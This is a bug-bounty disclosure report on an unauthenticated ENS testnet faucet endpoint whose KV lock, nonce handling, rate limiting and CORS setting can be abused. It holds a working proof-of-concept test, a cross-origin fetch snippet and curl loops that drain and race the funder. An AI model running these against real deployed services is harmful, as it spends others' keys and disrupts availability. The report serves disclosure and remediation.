# 90264 w a low unauthenticated post wallet fund spends a server held private key behind a non atomic kv lock allowing concurrent funds to collide on the funder s nonce and to be issued witho&#x20;

**Submitted on Aug 24th 2026 at 04:49:47 UTC by @daivo for** [**Audit Competition | ENS**](https://immunefi.com/audit-competition/audit-competition-ens)

* **Report ID:** #90264
* **Report Type:** Websites & Apps
* **Report severity:** Low
* **Target:** <https://github.com/immunefi-team/audit-comp-ens/tree/audit-comp-ready/workers>
* **Impacts:**

## Description

## Brief/Intro

`POST /wallet/fund` accepts an arbitrary address with **no authentication** and signs transactions with `ETH_PRIVATE_KEY` — the only hot signing key in the audit scope. Its per-address anti-abuse check does not bound the number of addresses, the route has no rate limiting, and the mutex intended to serialise funding per address is a non-atomic check-then-set on Cloudflare KV, which provides no compare-and-swap. Two concurrent requests for the same address both pass the guard and both broadcast; in the window before either transaction reaches the mempool they are signed against the **same nonce**. The worker also applies `cors()` with no options, so `Access-Control-Allow-Origin: *` and any third-party website can drive the endpoint from its visitors' browsers — no attacker infrastructure and no fixed source IP. The endpoint is the in-app funding source for smart-account setup and for the v1→v2 migration flow, which the release notes describe as *"entirely wallet-paid"* and needing real sepETH.

## Vulnerability Details

`workers/api-worker/src/app/routes/wallet/index.ts:97`. The route is declared with `injectDb` and a body validator only — **no `requireAuth`**, unlike every other state-changing route in the worker:

```ts
export default createApp()
  .basePath('/wallet')
  .post('/fund', injectDb, vValidator('json', v.object({ address: ethAddress })), async (c) => {
```

### 1. The lock is not a lock

`:128`:

```ts
const lockKey = KV_KEY.WALLET.FUND_LOCK(address)
if (await c.env.KV.get(lockKey)) {
  logger.debug('Fund already in progress for address, skipping', { address })
  return c.json({ txHash: null })
}
await c.env.KV.put(lockKey, 'locked', { expirationTtl: 60 })
```

* **Check-then-set is not atomic.** Cloudflare KV exposes no compare-and-swap, so two requests both read `null`, both write, and both proceed.
* **KV is eventually consistent across colos.** The handler's own comment concedes this: *"KV is best-effort across colos (fine for a testnet faucet)."*
* **The TTL can expire mid-flight.** `expirationTtl: 60`, but the handler then `await`s two `waitForTransactionReceipt` calls with no timeout, so a slow block releases the lock while the operation is still running.

### 2. No nonce management

Both the mint (`writeContract` → Multicall3 `aggregate3`) and the ETH drip (`sendTransaction`) are issued from the same account with no explicit nonce.

Stated precisely, because this bounds the defect: viem's `prepareTransactionRequest` reads the nonce with `blockTag: 'pending'` (`viem/_esm/actions/wallet/prepareTransactionRequest.js:250`), so once the first transaction reaches the node's mempool a later caller receives an incremented value. The collision is therefore a **TOCTOU window**, not the steady state: both requests must call `eth_getTransactionCount` before either broadcasts. With no mutex able to close that window — see defect 1 — and two `await`ed receipt waits inside it, the window is reachable rather than theoretical, but it is a race and the report does not claim otherwise. The PoC's RPC stub holds the nonce fixed to model exactly that interleaving.

### 3. The anti-abuse check is per address, not per caller

`:165`:

```ts
const hasEnoughTokens =
  usdcBalance >= TOKENS.USDC.mintAmount / 10n &&
  daiBalance  >= TOKENS.DAI.mintAmount  / 10n
```

Nothing limits how many **distinct** addresses one client funds; each fresh address costs the funder one Multicall3 mint transaction.

### 4. No rate limiting on this route

Grep confirms the only rate limiter anywhere in the service is `EMAIL_VERIFICATION_RATE_LIMIT_MAX_SENDS = 3` per hour on email verification (`services/notifications/email-verification-rate-limit.ts`). `app/middleware/hono.ts` adds none.

### 5. Any website can call it from its visitors' browsers

`app/index.ts:15` applies CORS with no configuration:

```ts
const app = createApp()
  .use('/*', cors())          // origin: '*', allowMethods includes POST
```

In hono 4.12.34 `allowHeaders` defaults to `[]`, and the preflight handler then **echoes** the request's `Access-Control-Request-Headers` back (`hono/dist/middleware/cors/index.js:57-59`). A cross-origin `POST … content-type: application/json` therefore passes preflight and succeeds. Combined with the missing `requireAuth`, an unrelated page can make every visitor fund attacker-chosen addresses: distributed across real residential IPs, with no attacker-controlled server and no single source to block. This is also what defeats the obvious remediation — a per-IP rate limit does not bound a botnet of ordinary browsers.

## Impact Details

* **Unauthenticated spend of a server-held key.** The route signs with `ETH_PRIVATE_KEY`, the only hot signing key in the audit scope, for any caller who can reach it. Every other state-changing route in the worker applies `requireAuth`; this one does not.
* **Nonce wedge (availability).** Within the TOCTOU window described above, two concurrent funds for one address are signed against the same nonce. On-chain one replaces the other or fails `nonce too low` / `replacement transaction underpriced`. A stuck nonce halts **all** faucet funding, not just the racing caller's.
* **Funder drain (availability).** Iterating fresh addresses costs the funder one Multicall3 mint transaction each, with no authentication and no rate limit, exhausting its sepETH.
* **Browser-driven amplification.** Because of the wide-open CORS policy the two points above do not need an attacker-controlled client at all — any page with traffic can source the requests from its visitors.
* **Downstream.** The endpoint is not migration-specific: the Manager calls it during general smart-account setup (`apps/manager/src/lib/smart-account/SmartAccountContext.tsx:394`) as well as from the migration gas hook (`features/migration/hooks/useMigrationGasFunding.ts:53`). With the faucet wedged, in-app funding for both is unavailable.

**Bounding, stated plainly.** The assets are testnet only (Sepolia ETH and mock stablecoins); the ETH drip — though not the token mint — is additionally gated on `hasV1Names(address)`; and the handler's own drip failure path notes *"the owner can still top up from a public faucet."* None of these is an availability impact on the application itself, which is why this is filed as an Insight. The value of the report is the pattern: an unauthenticated, un-rate-limited, cross-origin-reachable route that spends a private key behind a mutex that cannot serialise, shipped on testnet with the same shape it would have on mainnet.

## Relationship to known issues

No published entry covers `/wallet/fund`. `workers/` has exactly one entry in the known-issues list (**R2-05**, the SendGrid webhook failing open), which is a different route, a different mechanism, and already fixed in this tree. This falls under *"everything found in areas these audits did not cover."*

## References

* `workers/api-worker/src/app/routes/wallet/index.ts:97-270`
* `workers/api-worker/src/app/middleware/auth.ts` (`requireAuth`, not applied here)
* `workers/api-worker/src/services/notifications/email-verification-rate-limit.ts` (the only rate limiter in the service)
* `workers/api-worker/src/app/index.ts:15` (`cors()` with no options)
* `hono/dist/middleware/cors/index.js:5-6,57-59` (empty `allowHeaders` echoes the request headers)
* `apps/manager/src/lib/smart-account/SmartAccountContext.tsx:394` and `apps/manager/src/features/migration/hooks/useMigrationGasFunding.ts:53` (callers)
* `viem/_esm/actions/wallet/prepareTransactionRequest.js:250` (`blockTag: 'pending'`)
* `apps/manager/docs/HCA_MIGRATION_RELEASE_NOTES.md` — migration is wallet-paid and needs sepETH
* Cloudflare KV consistency model: <https://developers.cloudflare.com/kv/concepts/how-kv-works/>

## Proof of Concept

{% stepper %}
{% step %}

## Save the test file

Save the file below as `workers/api-worker/src/app/routes/wallet/F-003.test.ts`.

```ts
/**
 * Proof of concept — unauthenticated POST /wallet/fund with a non-atomic KV lock.
 *
 * Save as: workers/api-worker/src/app/routes/wallet/F-003.test.ts
 * Run:     cd workers/api-worker && pnpm vitest run src/app/routes/wallet/F-003.test.ts
 *
 * Drives the real exported Hono app. Nothing inside the handler is mocked: the
 * JSON-RPC transport is stubbed at fetch (no network is touched) and KV is a stub
 * with realistic async get/put/delete and NO compare-and-swap, matching Cloudflare
 * KV's actual semantics. The RPC stub holds `eth_getTransactionCount` fixed to
 * model the TOCTOU window: viem reads the nonce with blockTag 'pending', so the
 * collision requires both requests to read it before either broadcasts. The stub
 * reproduces that interleaving; it is not the steady state.
 */
import { beforeEach, describe, expect, it, vi } from 'vitest'
import walletApp from './index'

/** Records every JSON-RPC method the handler issues, and answers canned data. */
const rpcCalls: string[] = []
const broadcasts: string[] = []
const noncesServed: number[] = []
let nonce = 7

function installRpcStub() {
  rpcCalls.length = 0
  broadcasts.length = 0
  noncesServed.length = 0
  nonce = 7

  vi.stubGlobal('fetch', async (_url: unknown, init?: RequestInit) => {
    const body = JSON.parse(String(init?.body ?? '{}'))
    const batch = Array.isArray(body) ? body : [body]

    const answer = (req: { id: number; method: string }) => {
      rpcCalls.push(req.method)
      const ok = (result: unknown) => ({ jsonrpc: '2.0', id: req.id, result })
      switch (req.method) {
        case 'eth_chainId':
          return ok('0xaa36a7')
        case 'eth_call':
          return ok(`0x${'0'.repeat(64)}`) // balanceOf -> 0
        case 'eth_getBalance':
          return ok('0x0')
        case 'eth_getTransactionCount':
          // Deliberately does NOT advance: a pending tx that has not been mined
          // yields the same nonce to a concurrent caller.
          noncesServed.push(nonce)
          return ok(`0x${nonce.toString(16)}`)
        case 'eth_estimateGas':
          return ok('0x186a0')
        case 'eth_gasPrice':
          return ok('0x3b9aca00')
        case 'eth_maxPriorityFeePerGas':
          return ok('0x3b9aca00')
        case 'eth_feeHistory':
          return ok({ baseFeePerGas: ['0x1'], gasUsedRatio: [0], oldestBlock: '0x1', reward: [['0x1']] })
        case 'eth_getBlockByNumber':
          return ok({ number: '0x1', baseFeePerGas: '0x1', timestamp: '0x1' })
        case 'eth_blockNumber':
          return ok('0x1')
        case 'eth_sendRawTransaction': {
          const hash = `0x${(broadcasts.length + 1).toString(16).padStart(64, '0')}`
          broadcasts.push(hash)
          return ok(hash)
        }
        case 'eth_getTransactionReceipt':
          return ok({
            transactionHash: `0x${'1'.repeat(64)}`,
            blockNumber: '0x2', blockHash: `0x${'2'.repeat(64)}`,
            status: '0x1', gasUsed: '0x1', cumulativeGasUsed: '0x1',
            logs: [], logsBloom: `0x${'0'.repeat(512)}`,
            transactionIndex: '0x0', from: '0x' + '0'.repeat(40),
            to: '0x' + '0'.repeat(40), contractAddress: null, type: '0x2',
            effectiveGasPrice: '0x1',
          })
        default:
          return ok(null)
      }
    }

    const res = Array.isArray(body) ? batch.map(answer) : answer(batch[0])
    return new Response(JSON.stringify(res), {
      headers: { 'content-type': 'application/json' },
    })
  })
}

/** KV stub with realistic async get/put and NO compare-and-swap (like real KV). */
function makeAsyncKv(latencyMs = 5) {
  const store = new Map<string, string>()
  const tick = () => new Promise((r) => setTimeout(r, latencyMs))
  return {
    async get(k: string) { await tick(); return store.get(k) ?? null },
    async put(k: string, v: string) { await tick(); store.set(k, v) },
    async delete(k: string) { await tick(); store.delete(k) },
  } as unknown as KVNamespace
}

const ADDRESS = '0x00000000000000000000000000000000000000bb'

const env = (kv: KVNamespace) =>
  ({
    KV: kv,
    ETH_PRIVATE_KEY: `0x${'11'.repeat(32)}`,
    DATABASE_URL: 'postgresql://u:p@localhost:5432/db',
    SEPOLIA_RPC_URL: 'https://rpc.invalid',
  }) as unknown as CloudflareBindings

const fund = (kv: KVNamespace, address = ADDRESS) =>
  walletApp.request(
    '/wallet/fund',
    { method: 'POST', headers: { 'content-type': 'application/json' },
      body: JSON.stringify({ address }) },
    env(kv),
  )

beforeEach(() => { installRpcStub() })

describe('F-003: POST /wallet/fund', () => {
  it('is reachable with NO authentication and spends the funder key', async () => {
    const res = await fund(makeAsyncKv())
    if (res.status !== 200) {
      console.log('BODY:', await res.clone().text())
      console.log('RPC METHODS SEEN:', JSON.stringify(rpcCalls))
    }
    expect(res.status).toBe(200)
    expect(broadcasts.length).toBeGreaterThan(0)
    console.log(`\n  unauthenticated call -> ${broadcasts.length} signed tx broadcast\n`)
  })

  it('B2: the KV guard admits BOTH concurrent funds for ONE address', async () => {
    const kv = makeAsyncKv(8)
    const [a, b] = await Promise.all([fund(kv), fund(kv)])
    expect(a.status).toBe(200)
    expect(b.status).toBe(200)

    const counts = rpcCalls.filter((m) => m === 'eth_sendRawTransaction').length
    console.log(`  txs broadcast for ONE address: ${counts}`)
    console.log(`  nonces served: ${JSON.stringify(noncesServed)}`)
    expect(counts).toBeGreaterThan(1)
  })
})
```

{% endstep %}

{% step %}

## Run the test

```bash
cd workers/api-worker && pnpm vitest run src/app/routes/wallet/F-003.test.ts
```

{% endstep %}

{% step %}

## Verify the test behavior

The test drives the **real exported Hono app** (`walletApp`). Nothing inside the handler is mocked: the JSON-RPC transport is stubbed at `fetch` (so no network is touched) and KV is a stub with realistic async `get`/`put`/`delete` and **no compare-and-swap** — matching Cloudflare KV's actual semantics.

The RPC stub holds `eth_getTransactionCount` fixed to model the TOCTOU window described in Vulnerability Details §2: viem reads the nonce with `blockTag: 'pending'`, so the collision requires both requests to read it before either broadcasts. The stub reproduces that interleaving; it does not claim the nonce never advances.
{% endstep %}

{% step %}

## Confirm no authentication is required

A request carrying no `Authorization` header anywhere reaches `eth_sendRawTransaction`:

```
unauthenticated call -> 1 signed tx broadcast
```

{% endstep %}

{% step %}

## Confirm concurrent callers are admitted and collide

Two `POST /wallet/fund` requests for the **same** address are issued concurrently:

```
txs broadcast for ONE address: 2
nonces served: [7,7]
```

A working mutex would permit exactly one. Both transactions were signed against **nonce 7**. The point the test establishes is the first line: the KV guard admits both callers. The nonce collision is what follows whenever those two admitted callers interleave inside the pending-nonce window.
{% endstep %}

{% step %}

## Review the result

```
Tests 2 passed (2)
```

{% endstep %}
{% endstepper %}

### Cross-origin reachability

Confirm that no attacker-controlled client is needed. Open any page on an unrelated origin and run:

```js
// preflight succeeds: cors() echoes Access-Control-Request-Headers,
// and Access-Control-Allow-Origin is '*'
await fetch('https://<worker-host>/wallet/fund', {
  method: 'POST',
  headers: { 'content-type': 'application/json' },
  body: JSON.stringify({ address: '0x' + '11'.repeat(20) }),
})
```

Any site with traffic can issue this from every visitor, which is why a per-IP rate limit alone would not bound the abuse.

### Manual reproduction against a locally-run worker

Never use the deployed service; use a throwaway funder key.

```bash
# unbounded across addresses — each costs the funder a mint transaction
for i in $(seq 1 50); do
  curl -s -X POST "$API/wallet/fund" -H 'content-type: application/json' \
    -d "{\"address\":\"0x$(openssl rand -hex 20)\"}" &
done; wait

# race one address to exercise the non-atomic guard
for i in $(seq 1 10); do
  curl -s -X POST "$API/wallet/fund" -H 'content-type: application/json' \
    -d '{"address":"0x00000000000000000000000000000000000000bb"}' &
done; wait
```

## Suggested remediation

Authenticate the route with `requireAuth`, as every other state-changing route in the worker already does — that alone removes the cross-origin and unbounded-caller problems. Then serialise per address with a Durable Object (KV cannot express a mutex), manage the funder's nonce explicitly, set the lock TTL longer than the worst-case receipt wait, and restrict `cors()` to the app's own origins rather than `*`. The email-verification limiter already in the codebase is the pattern to copy for rate limiting.
